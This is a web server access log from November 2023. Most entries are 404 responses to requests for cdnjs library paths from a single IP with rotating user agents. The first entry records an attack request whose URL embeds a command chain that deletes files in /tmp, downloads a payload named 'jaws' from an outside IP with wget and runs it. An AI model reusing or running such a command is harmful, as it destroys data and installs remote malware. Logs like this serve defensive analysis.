197.60.180.235 - - [05/Nov/2023:21:59:27 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+91.92.243.35/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
3.231.155.26 - - [05/Nov/2023:23:09:34 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)"
3.231.155.26 - - [05/Nov/2023:23:09:34 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0"
3.231.155.26 - - [05/Nov/2023:23:09:34 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.0.13.81_10003810) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true"
3.231.155.26 - - [05/Nov/2023:23:09:34 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160 Safari/537.22"
3.231.155.26 - - [05/Nov/2023:23:09:35 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
3.231.155.26 - - [05/Nov/2023:23:09:35 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (PLAYSTATION 3; 1.10)"
3.231.155.26 - - [05/Nov/2023:23:09:36 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
3.231.155.26 - - [05/Nov/2023:23:09:36 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00"
3.231.155.26 - - [05/Nov/2023:23:09:36 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
3.231.155.26 - - [05/Nov/2023:23:09:37 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (iPod; U; CPU iPhone OS 6_1 like Mac OS X; en-HK) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/3.9174IP Mobile"
3.231.155.26 - - [05/Nov/2023:23:10:00 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39"
3.231.155.26 - - [05/Nov/2023:23:10:00 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4997.0 Safari/537.36"
3.231.155.26 - - [05/Nov/2023:23:10:00 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0"
